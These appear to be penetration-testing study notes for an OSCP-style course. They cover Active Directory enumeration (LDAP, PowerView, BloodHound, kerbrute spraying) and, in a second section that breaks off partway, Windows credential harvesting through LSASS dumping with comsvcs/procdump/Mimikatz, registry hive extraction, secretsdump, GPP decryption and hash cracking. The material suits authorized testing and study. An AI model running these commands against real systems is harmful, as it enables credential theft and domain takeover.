# Active Directory Domain Mapping [← Stage index](README.md) | [LDAP/Kerberos baseline](../02-service-enumeration/11-ldap-kerberos.md) | [AD cheatsheet](../../cheatsheets/active-directory.md) | [Master Notes](../../notes/Master_Notes.md#active-directory-attack-reasoning) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Map Active Directory attack paths](../../notes/methods/ad-mapping.md) > **Prerequisite:** one authorized domain identity and a route to the required DC/hosts. Record the source host, exact identity, domain FQDN, DNS server, DC FQDN/IP and time state before interpreting failures. > > **Coverage:** mapping only. SPNs, ACLs, sessions and credentials are candidate transitions; ticket requests, directory changes, credential access and remote execution belong to the later Stage 06 procedures. > > **Exit:** produce a ranked, manually checked map in the form `CONTROLLED IDENTITY → EFFECTIVE RELATIONSHIP → OBJECT/HOST → REACHABLE SERVICE → POSSIBLE NEW ACCESS`. ## AD capability transitions ![AD capability transitions](../../diagrams/ad-capability-transitions.png) [Open scalable SVG](../../diagrams/ad-capability-transitions.svg) | [Open PNG](../../diagrams/ad-capability-transitions.png) ## 1. Keep four maps, not one tool output ```text IDENTITY MAP: USER/COMPUTER -> DIRECT + NESTED GROUPS -> DIRECTORY RIGHTS HOST MAP: COMPUTER -> OS/ROLE -> LOCAL/REMOTE-ACCESS RIGHTS -> SESSIONS ROUTE MAP: SOURCE -> DNS/KDC/DC/HOST -> REQUIRED PORT/SERVICE LEAD MAP: EVIDENCE -> HYPOTHESIS -> MINIMUM VALIDATION -> NEXT BLOCK ``` Authentication, authorization, reachability and session presence are independent. A valid LDAP bind does not prove share access; SMB administration on one host does not prove directory privilege; a session edge does not prove retrievable credentials. ## 2. Establish identity, domain, DC, DNS and time ### Domain-joined Windows source ```cmd whoami /all echo %USERDNSDOMAIN% echo %USERDOMAIN% echo %LOGONSERVER% nltest /dsgetdc:DOMAIN nltest /dclist:DOMAIN w32tm /query /status ``` ```powershell [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() Resolve-DnsName -Type SRV _ldap._tcp.dc._msdcs.DOMAIN Resolve-DnsName -Type SRV _kerberos._tcp.DOMAIN ``` > **Decisive output:** domain FQDN, DC FQDN/IP, current user SID/groups, DNS SRV answers and a plausible time source. `USERDOMAIN` can be a NetBIOS label; prefer the DNS domain for LDAP/Kerberos. ### Kali/off-domain source ```bash dig +short SRV _ldap._tcp.dc._msdcs.DOMAIN @DC_IP dig +short SRV _kerberos._tcp.DOMAIN @DC_IP nxc smb DC_IP -d DOMAIN -u USER -p 'PASSWORD' ldapsearch -x -LLL -H ldap://DC_HOST:389 -s base -b '' \ defaultNamingContext configurationNamingContext rootDomainNamingContext dnsHostName ``` > RootDSE is a directory-server metadata object. Reading it can reveal naming contexts even when anonymous subtree searches are denied. Convert `corp.example` to `DC=corp,DC=example`; do not guess the base DN when RootDSE can supply it.
Remote Windows session and double-hop caveat ```cmd whoami /all klist dir \\DC_HOST\SYSVOL ``` A supplied credential may create the remote session without being delegated onward to the DC. If local identity commands work but access to a second host fails, distinguish a WinRM/PowerShell remoting credential-delegation problem from invalid credentials. An interactive RDP session, explicit credentials, `/netonly` network credentials or an off-domain LDAP client may create a different context; always record which identity is used locally and over the network.
## 3. Native Windows baseline ```cmd net user /domain net user USER /domain net group /domain net group "Domain Admins" /domain net group "GROUP" /domain net accounts /domain nltest /domain_trusts /all_trusts net view /domain net view \\DC_HOST ``` These commands are broadly available but provide partial views. Expand interesting users and groups individually, trace nested groups rather than assuming `memberOf` is complete, and retain SIDs when names can collide across domains.
RSAT ActiveDirectory module, only when installed ```powershell Get-Command -Module ActiveDirectory Get-ADDomain Get-ADForest Get-ADDomainController -Filter * Get-ADUser -Filter * -Properties Enabled,Description,MemberOf,ServicePrincipalName,UserPrincipalName,PasswordLastSet,LastLogonDate,AdminCount Get-ADGroup -Filter * -Properties GroupScope,GroupCategory,Members,Description Get-ADGroupMember -Identity 'GROUP' -Recursive Get-ADComputer -Filter * -Properties DNSHostName,OperatingSystem,OperatingSystemVersion,ServicePrincipalName,TrustedForDelegation,LastLogonDate Get-ADTrust -Filter * ``` `Get-AD*` cmdlets require the RSAT ActiveDirectory module. Its absence on a client is normal; use ADSI, LDAP, PowerView or an off-domain client.
## 4. Built-in ADSI/DirectorySearcher fallback For automatic, explicitly scoped inventory, run the [AD surface helpers](../../scripts/ad-map/README.md) with an explicit DC/domain. Collection runs by default, prints a bounded findings summary and saves a unique private evidence directory; `-Preview` displays checks without connecting. The helper preserves query failures, candidate clues, account-context limits and linked manual-validation handoffs without requesting roast material or changing directory objects. For repeated queries, [define LDAPSearch once inline](../../cheatsheets/active-directory.md#define-ldapsearch-once-in-this-powershell-session), then use its purpose-labelled calls. The transparent one-off procedure below remains useful when no helper is loaded. ```powershell $root = [ADSI]'LDAP://RootDSE' $base = [ADSI]("LDAP://" + $root.defaultNamingContext) $searcher = New-Object System.DirectoryServices.DirectorySearcher($base) $searcher.PageSize = 1000 $searcher.PropertiesToLoad.AddRange(@('samaccountname','userprincipalname','objectsid','memberof','serviceprincipalname','description','useraccountcontrol','pwdlastset','lastlogontimestamp')) $searcher.Filter = '(&(objectCategory=person)(objectClass=user))' $searcher.FindAll() | ForEach-Object { $_.Properties } ``` Change only the filter and requested attributes for another object class: ```powershell # Groups $searcher.Filter = '(objectCategory=group)' $searcher.PropertiesToLoad.Clear() $searcher.PropertiesToLoad.AddRange(@('samaccountname','objectsid','member','grouptype','description')) $searcher.FindAll() | ForEach-Object { $_.Properties } # Computers $searcher.Filter = '(objectCategory=computer)' $searcher.PropertiesToLoad.Clear() $searcher.PropertiesToLoad.AddRange(@('dnshostname','operatingsystem','operatingsystemversion','serviceprincipalname','useraccountcontrol','lastlogontimestamp')) $searcher.FindAll() | ForEach-Object { $_.Properties } ``` > `PageSize = 1000` asks for paged results; without paging, the server's result-size limit can silently produce an incomplete inventory. LDAP filters are data selection, not proof of access or exploitability. ## 5. Authenticated LDAP from Kali ### Discover the naming context ```bash ldapsearch -x -LLL -H ldap://DC_HOST:389 -s base -b '' \ defaultNamingContext configurationNamingContext rootDomainNamingContext dnsHostName ``` ### Users, groups and computers ```bash ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(&(objectCategory=person)(objectClass=user))' \ sAMAccountName userPrincipalName objectSid userAccountControl memberOf description servicePrincipalName pwdLastSet lastLogonTimestamp adminCount ``` ```bash ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(objectCategory=group)' sAMAccountName objectSid member groupType description ``` ```bash ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(objectCategory=computer)' dNSHostName operatingSystem operatingSystemVersion servicePrincipalName userAccountControl lastLogonTimestamp ```
SPNs, trusts and GPO/OU context ```bash # SPN-bearing accounts: mapping only; do not request tickets in this block. ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))' \ sAMAccountName servicePrincipalName memberOf userAccountControl pwdLastSet ``` ```bash # Trusted-domain objects ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -b 'DC=DOMAIN,DC=TLD' '(objectClass=trustedDomain)' \ cn securityIdentifier trustDirection trustType trustAttributes ``` ```bash # OUs and GPO containers; correlate links before inferring host effect. ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(|(objectClass=organizationalUnit)(objectClass=groupPolicyContainer))' \ distinguishedName displayName name gPLink gPOptions ```
### LDAP failure router | Result | Interpretation | Next action | | --- | --- | --- | | `Invalid credentials (49)` | Bind identity/secret/context failed; subcodes may refine the cause | Recheck UPN vs `DOMAIN\USER`, account state and exact secret; do not infer authorization | | `Strong(er) authentication required` / confidentiality required | Server policy rejects that bind/transport | Use the permitted LDAPS/StartTLS or Kerberos/SASL path; do not disable protections | | `Size limit exceeded` or suspiciously round count | Search is incomplete | Add paged results and narrow the base/filter | | Referral/partial results | Search crossed a naming-context boundary | Query the referred domain/partition or compatible Global Catalog deliberately | | Bind succeeds, search empty | Wrong base/filter, ACL filtering or genuinely no matches | Verify RootDSE base, test a known object and request fewer attributes | | Works by IP, Kerberos fails | Route exists but name/SPN/DNS/time path is wrong | Use DC FQDN, AD DNS, correct realm and synchronized time | ## 6. PowerView: convenient manual breadth ```powershell Import-Module .\PowerView.ps1 Get-Command -Module PowerView Get-Domain Get-DomainController Get-DomainTrust Get-DomainUser | Select-Object samaccountname,userprincipalname,description,memberof,serviceprincipalname Get-DomainGroup Get-DomainGroupMember -Identity 'GROUP' -Recurse Get-DomainComputer | Select-Object dnshostname,operatingsystem,operatingsystemversion Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof ``` The original PowerSploit repository is archived. Course examples and forks may use legacy aliases such as `Get-NetUser`, `Get-NetGroup`, `Get-NetComputer` or `Get-NetDomainTrust`. Inspect `Get-Command`/`Get-Help` for the exact copy present rather than mixing generations. ## 7. Shares, SYSVOL and NETLOGON ### Inventory, then test the object ```cmd net view \\DC_HOST dir \\DC_HOST\SYSVOL dir \\DC_HOST\NETLOGON ``` ```bash nxc smb DC_IP -d DOMAIN -u USER -p 'PASSWORD' --shares smbclient -L //DC_IP -U 'DOMAIN/USER' smbclient //DC_IP/SYSVOL -U 'DOMAIN/USER' -c 'recurse ON; ls' smbclient //DC_IP/SHARE -U 'DOMAIN/USER' ``` Inside `smbclient`, use `ls`, `cd`, `get FILE` and a harmless approved `put` only when write validation is needed. Share listing, share connection, file read and file write are separate permissions. Inspect authorized readable policy/logon/deployment paths for scripts, configurations, backups, connection strings and legacy Group Policy Preferences XML containing `cpassword`. Selectively retrieve relevant files; do not bulk-copy a share merely because it is readable. A discovered secret returns to the credential-classification procedure. ## 8. Service accounts and SPNs ```cmd setspn -Q */* setspn -L ACCOUNT ``` ```powershell Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof,useraccountcontrol,pwdlastset ``` Record `account → service class/host/port → groups → password age/encryption/delegation clues → reachable service`. An SPN means the account represents a Kerberos service identity; it does not mean the password is weak, the service is reachable or the account is privileged. Ticket acquisition/cracking is Block 11. ## 9. Directory ACLs and effective control ```powershell Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight|WriteProperty|Self' } | Select-Object ObjectDN,SecurityIdentifier,ActiveDirectoryRights,ObjectAceType,AceType,IsInherited,InheritanceType ``` PowerView normally exposes the trustee as `SecurityIdentifier`. Resolve that SID and trace controlled direct/nested membership. `-ResolveGUIDs` resolves operation GUIDs; it does not make every trustee a friendly account name. A blank projected column can mean the selected property is absent, not that an ACE has no trustee.
Compatible copy that actually emits IdentityReference Use this projection only when inspecting the returned object confirms that the loaded implementation provides `IdentityReference`. ```powershell Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight|WriteProperty|Self' } | Select-Object ObjectDN,IdentityReference,ActiveDirectoryRights,ObjectAceType,AceType,IsInherited,InheritanceType ``` If the value is an unresolved SID, resolve it before applying the rule to a controlled principal.
| Candidate right | Possible transition to validate later | Missing proof now | | --- | --- | --- | | `GenericAll` | Broad object modification | Controlled trustee, target object class, applicable deny/inheritance and useful change | | `GenericWrite` / `WriteProperty` | Change one or more writable attributes | Exact attribute/object GUID and a transition that consumes it | | `WriteOwner` | Become owner | Ability to change the DACL afterward and use the resulting right | | `WriteDacl` | Add an ACE | Effective write-DACL right, planned narrow ACE and restoration | | `AllExtendedRights` / `ForceChangePassword` | Extended operation such as reset where applicable | Object class, exact extended right and downstream usefulness | | `Self` / validated write | Add self/member or another validated attribute where schema permits | Correct validated-write GUID and target type | | GPO/OU control | Affect linked computers/users | Writable GPO component, effective link/scope, refresh/trigger and target placement | An ACE is one rule. Effective access depends on trustee/group nesting, allow/deny semantics, inheritance, object-specific GUIDs and security descriptor scope. Do not perform the modification in this mapping block. ## 10. Host-access candidates ```powershell Find-LocalAdminAccess ``` ```bash nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares ``` `Find-LocalAdminAccess` is a broad candidate generator and can be noisy or blocked by firewall/RPC controls. Validate a selected host with the service you may actually use. NetExec's `(Pwn3d!)` indicates administrative SMB context according to that tool; it does not establish RDP, WinRM, WMI/DCOM or directory rights. RDP, WinRM, SMB/service control and WMI/DCOM each have different ports, services, policies and authorization. ## 11. Sessions are volatile hints ```powershell Get-NetSession -ComputerName COMPUTER -Verbose Get-NetLoggedon -ComputerName COMPUTER ``` ```cmd PsLoggedOn.exe \\COMPUTER ``` `Get-NetSession` relies on workstation/session enumeration APIs that modern Windows may restrict. PsLoggedOn combines Registry profile evidence with `NetSessionEnum`; remote Registry access and sufficient rights are relevant, and querying can itself create a network-session entry. Therefore: - empty/denied is **inconclusive**, not proof of no users; - a session is a time-sensitive observation, not a durable ACL; - a session matters only if the current identity can reach/control that host and a later credential/ticket technique applies; - session presence does not prove credentials are resident, accessible or reusable. ## 12. BloodHound: collect narrowly, rank, then validate ### Current SharpHound CE Low-noise directory baseline that avoids contacting every workstation: ```powershell .\SharpHound.exe --CollectionMethods DCOnly --OutputDirectory .\bh --ZipFileName domain-dconly.zip ``` Add host facts only when they can answer the next question: ```powershell .\SharpHound.exe --CollectionMethods LocalGroup --ComputerFile .\candidate-hosts.txt --OutputDirectory .\bh --ZipFileName candidate-localgroups.zip .\SharpHound.exe --CollectionMethods Session --ComputerFile .\candidate-hosts.txt --Loop --LoopDuration 00:10:00 --OutputDirectory .\bh --ZipFileName candidate-sessions.zip ``` SharpHound with no collection flag uses its broader default, including directory data plus local-group/session attempts. `All` performs every supported method; it is not the first response to an unanswered narrow question. Import the output ZIP into a compatible BloodHound CE deployment and verify node/edge counts and ingestion errors.
Collector variants and compatibility ```powershell # Inspect the actual collector before using copied syntax. .\SharpHound.exe --help ``` ```bash # Community Linux collector; flags and output compatibility vary by release. bloodhound-python --help bloodhound-python -u USER -p 'PASSWORD' -d DOMAIN -ns DC_IP -dc DC_HOST -c All --zip ``` ```powershell # Legacy/course PowerShell collector; use only with a compatible legacy deployment. Import-Module .\SharpHound.ps1 Invoke-BloodHound -CollectionMethod All -OutputDirectory .\bh -ZipFileName legacy.zip ``` Use the collector version intended for the BloodHound deployment. `bloodhound-python`, legacy SharpHound PowerShell and current SharpHound CE are alternatives with different schemas/features, not interchangeable command spellings.
### Analyze in this order 1. Mark only identities/hosts actually controlled. A low-privilege session on a host does not make the host itself fully owned. 2. Inspect the controlled principal's direct and nested group memberships and outbound object-control edges. 3. Inspect reachable computers where it has local admin, RDP, WinRM/DCOM or other applicable rights. 4. Inspect high-value goals and shortest paths only as hypothesis generation. 5. Classify each selected edge: - directory/static-ish: group, ACL, GPO, OU, trust; - host-derived: local group or user right; - volatile: session; - route-dependent: the required host/service must be reachable now. 6. Reproduce the minimum important relationship manually before handing it to Block 11 or 12. ## 13. Candidate ledger and path ranking ```text ID | CONTROLLED PRINCIPAL | RELATIONSHIP | TARGET | SOURCE EVIDENCE | EFFECTIVE? | ROUTE/SERVICE | VOLATILITY | EXPECTED TRANSITION | MINIMUM VALIDATION | STATUS | NEXT BLOCK ``` Rank candidates by: 1. confidence that the relationship is effective; 2. deterministic value of the resulting identity/access; 3. route and service availability; 4. stability versus volatile session timing; 5. reversibility and impact; 6. number of unsupported assumptions. Prefer a validated readable share/credential clue or direct object right over a multi-edge path built from stale sessions and unreachable hosts. ## 14. Failure routing | Symptom | Most likely layer | Next test | | --- | --- | --- | | DC IP reachable, domain names fail | DNS/name layer | Query AD DNS SRV/A records; use FQDN; check source resolver | | Kerberos fails while SMB/LDAP by IP works | Name/SPN/time/KDC route | FQDN, realm, clock, UDP/TCP 88 and ticket state | | Domain identity works locally but not from remote shell to DC | Credential delegation/double hop | `klist`, SYSVOL access, explicit/off-domain context | | LDAP bind succeeds but results are incomplete | Search scope/paging/ACL | RootDSE base, paging, known-object query, requested attributes | | Share appears but files deny access | Object authorization | Enter share and test exact directory/file; separate read from write | | `Find-LocalAdminAccess` returns nothing | Enumeration limitation or no rights | Test one evidence-backed host/service manually | | Session enumeration is empty/denied | API/rights/firewall/time limitation | Treat inconclusive; retry only where host access/value supports it | | BloodHound path exists but host is unreachable | Route/service layer | Move to [Stage 07](../07-pivoting-tunneling/README.md) before identity attacks | | BloodHound import is empty/odd | Collection/schema/ingest issue | Inspect collector logs/ZIP, domain/DNS, method and version compatibility | | ACL appears powerful but cannot be tied to current user | Trustee/nesting/scope problem | Resolve SID, nested groups, deny/inheritance and target object GUID | ## 15. Handoffs - SPN, roastable/no-preauth candidate, useful ACL/GPO right, readable secret or privileged-host credential opportunity → [identity transitions and object control](03-kerberos-and-identity-transitions.md), [credential access](02-credential-access.md), or [object control](04-object-control-adcs-and-domain-compromise.md). - Password/hash/ticket plus validated host authorization → [lateral movement](05-lateral-movement.md). - Required internal host/service unreachable → [pivoting and tunneling](../07-pivoting-tunneling/README.md). - Any new identity, host, route, subnet or domain → repeat the relevant mapping branches. ## Tooling for this section | Tool | Choose it when | Requirements | Baseline | Decisive output | Failure cue | | --- | --- | --- | --- | --- | --- | | `whoami`, `net`, `nltest`, `setspn`, DNS/time tools | Always on a domain Windows source | Domain context; command availability varies | Sections 2–3 and 8 | Exact identity/domain/DC/group/SPN facts | Partial output; use LDAP/ADSI for breadth | | ADSI/DirectorySearcher | RSAT/PowerView is absent | Windows PowerShell/.NET and DC reachability | Section 4 | Paged objects with requested attributes | 1000-ish limit/empty output: paging, base, filter or rights | | `ldapsearch` | Off-domain/raw LDAP control is useful | DC FQDN/IP, base DN, credentials for subtree queries | Section 5 | Successful bind and complete paged results | Error 49, stronger auth, referral or size limit | | PowerView | Fast manual AD relationship queries | Known script/version and Windows PowerShell | Section 6 | Named object/group/ACL/host candidates | Archived/fork syntax and blocked APIs require native fallback | | NetExec | Validate SMB identity, shares or selected admin candidate | Kali, route to service, credentials | `nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares` | Auth line, share rights, optional SMB admin marker | SMB result does not prove other protocols | | `smbclient` | Manually inspect a specific share/object | SMB route and credentials | `smbclient //TARGET/SHARE -U 'DOMAIN/USER'` | Exact list/read/write result | Listing and file access can differ | | PsLoggedOn | Check one justified host for users | Windows binary; remote Registry/session access | `PsLoggedOn.exe \\COMPUTER` | Local-profile/network-session entries | Access/Remote Registry limitations; query adds an artifact | | SharpHound CE + BloodHound CE | Graph directory/host relationships | Compatible collector/deployment, DNS/DC route, authorized collection | `SharpHound.exe --CollectionMethods DCOnly ...` | Ingested nodes/edges and candidate paths | Collection errors, stale sessions, incompatible schema | | `bloodhound-python` / LDAPDomainDump | Linux-side fallback/reporting | Kali packages, LDAP/DNS route, credentials, compatible output expectations | Inspect `--help`; use only the needed collection/report | Directory relationships/HTML or BloodHound output | Feature/schema differences from SharpHound CE | ## Kerbrute — confirm candidate names before password testing Use with the real domain and reachable KDC. Names generated from emails/wordlists remain candidates until verified. ```bash kerbrute userenum -d DOMAIN --dc DC_IP --delay 1000 -o valid-users.txt users.txt # A separate password test, only after reading lockout policy and attempt history kerbrute passwordspray -d DOMAIN --dc DC_IP --delay 1000 --safe \ users.txt 'PASSWORD' ``` Read: a valid principal is not a valid password or host access. Password pre-auth failures can count toward lockout; `--safe` stops on a reported lock but does not guarantee that no lockout occurs. Confirm a reported login with the relevant SMB/WinRM/LDAP client and keep the account scope explicit. DNS, time and a correct realm remain prerequisites. Sources: [upstream 1](https://github.com/ropnop/kerbrute). ## RustHound-CE — a cross-platform BloodHound collector Use a compatible RustHound-CE build when collecting directory relationships from Linux or when a SharpHound binary is unsuitable. CE output belongs in BloodHound CE, not Legacy. ```bash rusthound-ce -d DOMAIN -u 'USER@DOMAIN' -p 'PASSWORD' -f DC_HOST -z # When the directory requires LDAPS and the TLS/name prerequisites are met rusthound-ce -d DOMAIN -u 'USER@DOMAIN' -p 'PASSWORD' -f DC_HOST --ldaps -z ``` Read: import the generated archive, identify the exact useful edge and verify its underlying permission or host access. Directory collection does not establish a live privileged session on a workstation. LDAP/TLS, DNS or credential errors must be repaired before treating an incomplete graph as evidence of no path. Sources: [upstream 1](https://github.com/g0h4n/RustHound-CE/blob/main/HELP.md). ## GPP cpassword — recover a candidate from readable SYSVOL XML Use when an accessible preference XML contains a `cpassword` attribute. Search the SYSVOL files actually read/downloaded with the accepted account. ```bash grep -Rni 'cpassword' ./sysvol gpp-decrypt 'C_PASSWORD' ``` Read: keep the XML's username, host/policy scope and path beside the recovered value. Old preference files can contain stale credentials. Validate the matching account on a relevant service; a decrypted string is not proof of current domain or local-admin access. A modern domain need not contain these older preference secrets. Sources: [upstream 1](https://www.kali.org/tools/gpp-decrypt/). ## Kerberos clock skew — compare UTC and use a working time source Use when tickets fail with a skew error or the DC/workstation clock comparison is inconsistent. A timezone label is not the UTC clock value. ```bash date -u nmap -Pn -p 445 --script smb2-time DC_IP # If this DC is a confirmed reachable NTP source, correct the attack workstation sudo ntpdate -u DC_IP date -u ``` Read: retry the same ticket/service request after verifying the actual UTC difference. If the clock jumps back, identify the competing host/VM/time-sync source instead of repeatedly changing timezone settings. NTP silence can be filtering or an unavailable time service; it is not evidence that the KDC's displayed time was wrong. Sources: [upstream 1](https://nmap.org/nsedoc/scripts/smb2-time.html) · [upstream 2](https://www.kali.org/tools/ntpsec/). ## Sources - Supplied PEN-200, Chapter 22, pp705–757. - [OffSec OSCP+ Body of Knowledge](https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge) - [OffSec OSCP Exam FAQ](https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ) - [SpecterOps SharpHound CE](https://bloodhound.specterops.io/collect-data/ce-collection/sharphound) and [collection flags](https://bloodhound.specterops.io/collect-data/ce-collection/sharphound-flags) - [Microsoft RootDSE](https://learn.microsoft.com/windows/win32/adsi/rootdse) and [DirectorySearcher](https://learn.microsoft.com/dotnet/api/system.directoryservices.directorysearcher) - [Microsoft PsLoggedOn](https://learn.microsoft.com/sysinternals/downloads/psloggedon) - [NetExec share enumeration](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-shares-and-access) and [LDAP query](https://www.netexec.wiki/ldap-protocol/query-ldap) - [OpenLDAP Administrator's Guide](https://www.openldap.org/doc/admin24/guide.pdf) - [PowerSploit PowerView (archived)](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) - [getSH Active Directory route](https://lizajose.github.io/getSH/ad), source snapshot [`e1f62dd`](https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98) - [Hexdump Active Directory module](https://github.com/LeonardoE95/OSCP/tree/main/modules/active-directory) and [consolidated cheatsheet](https://github.com/LeonardoE95/OSCP/blob/main/cheatsheet.org). The live AD module was still a `TODO` when checked; its minimal legacy collection cues were independently updated against current SharpHound documentation.

# Windows and Domain Credential Access

[← Stage index](README.md) | [Domain mapping](01-domain-mapping.md) | [Credential handling](../04-shells-transfers-credentials/03-credential-use-and-cracking.md) | [AD cheatsheet](../../cheatsheets/active-directory.md) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Recover and use authentication material](../../notes/methods/credentials.md); [Gain a more useful domain identity](../../notes/methods/ad-identities.md)

> **Prerequisite:** an already authorized host/session and the exact privilege required by the selected source. Do not collect everything by default.
>
> **Decision:** `CURRENT IDENTITY → SOURCE → REQUIRED PRIVILEGE/PROTECTION → ARTIFACT TYPE → COMPATIBLE NEXT USE`.
>
> **Exit:** classify each result as password, NT hash, AES key, ticket, DPAPI material, cached verifier or local/domain secret; protect it in private records and re-enumerate only through compatible authentication.

## 1. Select the source before the tool

| Source | What it can contain | Typical prerequisite | Result is not automatically |
| --- | --- | --- | --- |
| Current ticket cache | TGTs and service tickets for the current logon session | Current user; other LUIDs normally require elevation | A password, NT hash or authorization to every service |
| LSASS memory/dump | Logon-session NTLM/AES/DPAPI material and tickets, depending on OS/protection/logon type | Administrator/SYSTEM, suitable debug/dump access, compatible architecture | Guaranteed cleartext or every user's reusable secret |
| SAM + SYSTEM | Local account password hashes | Administrator/SYSTEM/backup-capable access to matched hives | Domain-account material |
| SECURITY + SYSTEM | LSA secrets, service/machine secrets, cached domain verifiers | Administrator/SYSTEM/backup-capable access to matched hives | Directly passable cached-domain hashes |
| Credential Manager/DPAPI | Targeted saved credentials and protected application data | Suitable user/machine context plus master-key material | Plaintext merely because a blob/file is readable |
| NTDS + SYSTEM | Domain account hashes/keys from a DC database | DC-level file access and matched boot-key material | Ordinary member-server admin access |
| DRS replication | Selected domain-account secrets | Effective replication rights at the domain root | Local admin, DC service access or Domain Users membership |

## 2. Establish privilege and protection state

```cmd
whoami /all
tasklist /fi "imagename eq lsass.exe"
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LsaCfgFlags
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard /v LsaCfgFlags
```

```powershell
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
  Select-Object SecurityServicesConfigured,SecurityServicesRunning,VirtualizationBasedSecurityStatus
```

Interpretation:

- membership in Administrators with a medium-integrity filtered token is not equivalent to an elevated process;
- `SeDebugPrivilege` must be present and usable for common live-process access;
- a missing registry value is not definitive proof that a protection is disabled because defaults, policy and firmware state matter;
- LSA protection blocks untrusted code injection/process-memory access; Credential Guard isolates selected NTLM, Kerberos and saved-domain secrets with VBS;
- EDR/AV can block a tool or dump path without proving the underlying credential source is empty.

An access-denied or empty result disproves only that method in the current context.

## 3. Inspect tickets before invasive collection

```cmd
klist
klist tgt
klist sessions
```

When privileges permit inspecting another logon session:

```cmd
klist -li 0xLUID tickets
klist -li 0xLUID tgt
```

```cmd
Rubeus.exe triage
Rubeus.exe dump /luid:0xLUID /nowrap
```

> Do not use `klist purge` during triage. It destroys cached tickets and can break the current session. Interpret exported tickets using [Kerberos and identity transitions](03-kerberos-and-identity-transitions.md#6-ticket-inventory-classification-and-conversion).

## 4. LSASS: live logon-session material

### Direct Mimikatz access

```text
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
```

Decisive output is a named logon session with a typed value: NTLM, AES key, DPAPI key or ticket. A username with `Password : (null)` is not a failed tool run when another useful field exists, and modern Windows commonly does not retain reusable cleartext.

### Dump first, parse offline

Built-in `comsvcs.dll` method from an elevated command prompt:

```cmd
for /f "tokens=2" %A in ('tasklist ^| findstr /i lsass.exe') do rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %A C:\Windows\Temp\lsass.dmp full
```

Sysinternals ProcDump alternative:

```cmd
procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

Parse with a compatible Mimikatz build:

```text
mimikatz.exe
sekurlsa::minidump C:\Path\To\lsass.dmp
sekurlsa::logonpasswords
sekurlsa::tickets
```

Common failures:

- dump creation denied: token/protection/EDR or process-access prerequisite failed;
- `ProcessorArchitecture` mismatch: use compatible x64/x86 tooling;
- OS major-version mismatch: parse with a compatible build/environment;
- dump succeeds but secrets are absent: logon type, sign-out/reboot, Credential Guard and provider behavior affect contents.

LSASS dumps are sensitive and noisy. Hash the evidence if needed, transfer through the established route, store it privately and remove the target copy after the authorized objective.

## 5. SAM and SYSTEM: local identities

```cmd
reg save HKLM\SAM C:\Windows\Temp\SAM.hive /y
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y
```

```bash
impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
```

Mimikatz alternative from a suitable elevated context:

```text
privilege::debug
token::elevate
lsadump::sam
```

Interpret a typical account row as:

```text
LOCAL_USER:RID:LM_HASH:NT_HASH:::
```

The NT hash is local-account material. Its reuse depends on the same local password existing elsewhere, account state, remote UAC restrictions, service support and host authorization. Return it to the credential-classification workflow; do not call it a domain credential.

## 6. SECURITY and SYSTEM: LSA secrets and cached domain verifiers

```cmd
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.hive /y
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y
```

```bash
impacket-secretsdump -security SECURITY.hive -system SYSTEM.hive LOCAL
```

Mimikatz alternative:

```text
privilege::debug
token::elevate
lsadump::secrets
lsadump::cache
```

Potential categories:

- `$MACHINE.ACC`: member computer's domain-account secret/key material;
- service/autologon secrets: usefulness depends on whether the service/account remains active;
- `NL$1`-style cached logon data: DCC2/MSCache v2 verifier material.

DCC2 is for offline guessing, not Pass-the-Hash:

```bash
hashcat -m 2100 dcc2.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

Verify the exact format with the installed Hashcat examples before cracking.

## 7. Credential Manager and DPAPI

```cmd
cmdkey /list
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials" /all
```

```powershell
Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -Force -ErrorAction SilentlyContinue
Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Credentials" -Force -ErrorAction SilentlyContinue
